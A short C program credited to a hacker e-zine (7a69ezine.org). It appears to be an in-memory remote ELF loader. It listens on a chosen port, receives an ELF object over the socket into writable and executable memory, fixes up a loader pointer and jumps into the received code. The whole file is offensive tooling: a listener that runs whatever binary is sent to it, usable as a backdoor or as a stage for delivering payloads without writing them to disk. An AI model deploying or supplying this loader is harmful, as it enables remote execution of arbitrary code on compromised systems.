/*
 *  
 * (c) Pluf & Ripe / 7a69ezine.org
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <errno.h>

/* Change it if there is not enough size or similar */
#define	MAX_OBJECT_SIZE		5000000

int main(int argc, char **argv) 
{
	char tmp[4];
	int sfd, nsfd, i;
	unsigned long *ldr_ptr;
	struct sockaddr_in addr;
	unsigned char *buf;

	if (argc < 2) {
		printf("Usage:\n");
		printf("\t%s <port>\n", argv[0]);
		exit(0);
	}

	buf = (unsigned char*)mmap(0, MAX_OBJECT_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(atoi(argv[1]));
	addr.sin_addr.s_addr = 0;

	if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket()");
		exit(errno);
	}

	if (bind(sfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
		perror("bind()");
		exit(errno);
	}

	if (listen(sfd, 10) == -1) {
		perror("listen()");
		exit(errno);
	}

	if ((nsfd = accept(sfd, NULL, NULL)) == -1) {
		perror("accept()");
		exit(errno);
	}

	for (i = 0 ; i < 255 ; i++) {
		if (recv(i, tmp, 4, MSG_PEEK) == 4) {
			if (!strncmp(&tmp[1], "ELF", 3)) break;
		}
	}

	recv(i, buf, MAX_OBJECT_SIZE, MSG_WAITALL);

	ldr_ptr = (unsigned long *)&buf[9];
	*ldr_ptr += (unsigned long)buf;
	
	__asm__(
		"push %0\n"
		"jmp *%1"
		:
		: "c"(buf),"b"(*ldr_ptr)
		);

	return (0);
}

